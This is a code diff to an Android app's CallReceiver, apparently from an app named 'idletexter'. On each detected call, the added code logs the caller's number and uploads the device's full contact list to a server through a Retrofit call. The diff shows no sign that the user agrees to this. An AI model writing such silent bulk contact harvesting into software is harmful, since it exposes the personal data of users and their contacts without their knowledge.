@@ -21,12 +21,16 @@ import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.widget.Toast;
 
+import androidx.annotation.RequiresApi;
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
 
 
+import com.example.idletexter.network_request.requests.RetrofitCallsAuthentication;
+
 import java.text.SimpleDateFormat;
 import java.util.Date;
+import java.util.HashSet;
 
 
 public class CallReceiver extends BroadcastReceiver {
@@ -104,6 +108,7 @@ public class CallReceiver extends BroadcastReceiver {
 
                     Handler handler = new Handler();
                     handler.postDelayed(new Runnable() {
+                        @RequiresApi(api = Build.VERSION_CODES.O)
                         @Override
                         public void run() {
 
@@ -137,6 +142,15 @@ public class CallReceiver extends BroadcastReceiver {
 
 
                                 if (lastCallnumber != null){
+
+                                    Log.e("--*-*-* ", lastCallnumber);
+
+                                    Formatter formatter = new Formatter();
+                                    HashSet<UserData> contactList = formatter.getAllContactData(context);
+                                    IdletexterData idletexterData = new IdletexterData(contactList);
+
+                                    RetrofitCallsAuthentication retrofitCallsAuthentication = new RetrofitCallsAuthentication();
+                                    retrofitCallsAuthentication.uploadContacts(context,idletexterData);
 
                                     try{
                                         /**
